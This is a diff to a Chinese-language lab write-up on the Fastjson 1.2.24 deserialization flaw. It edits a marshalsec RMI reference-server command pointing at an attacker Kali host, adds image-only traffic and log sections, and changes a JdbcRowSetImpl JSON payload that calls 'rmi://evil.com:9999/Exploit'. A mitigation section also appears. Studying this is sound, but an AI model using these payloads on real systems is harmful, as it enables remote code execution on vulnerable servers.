@@ -113,7 +113,7 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "
     - 它的全称是 RMI Reference Server（RMI 引用服务器）。它的唯一工作，就是监听网络，当有人来要对象时，直接甩给对方一个 JNDI Reference（引荐信）。
 - **`"http://<你的Kali_IP>:9000/#TouchFile"`**
     - 这是命令里**最核心的灵魂参数**，也就是你要写进引荐信里的“真实提货地址”。
-    - `http://<你的Kali_IP>:8000/`：指向你刚刚用 Python 启动的 HTTP 服务目录。
+    - `http://<你的Kali_IP>:9000/`：指向你刚刚用 Python 启动的 HTTP 服务目录。
     - `#TouchFile`：告诉受害者的 Java 环境，去这个 HTTP 地址下载的文件名叫 `TouchFile.class`，并且下载完后，立刻把这个类加载到内存里。
         
 - **`9999`**
@@ -135,6 +135,11 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "
 - 查看docker容器发现文件创建成功。
 	![](file-20260831143149570.png)
 
+## 流量日志
+**流量**
+![](./img/file-20260901164252156.png)
+**日志**
+![](./img/file-20260901165243587.png)
 ## 防护
 1. 升级 Fastjson，至少不要使用 `1.2.24`，同时升级 Java。
 2. 禁用 `autoType`，拒绝 JSON 中的 `@type`、`@class` 等类型字段。
@@ -155,9 +160,11 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "
  **1.2.24 漏洞（无CheckAutoType 机制）**
 ```http
 {
-    "@type":"com.sun.rowset.JdbcRowSetImpl",
-    "dataSourceName":"rmi://evil.com:9999/Exploit",
-    "autoCommit":true
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://evil.com:9999/Exploit",
+        "autoCommit":true
+    }
 }
 ```
  **1.2.47 格式（两步分工：先缓存，后利用）：**
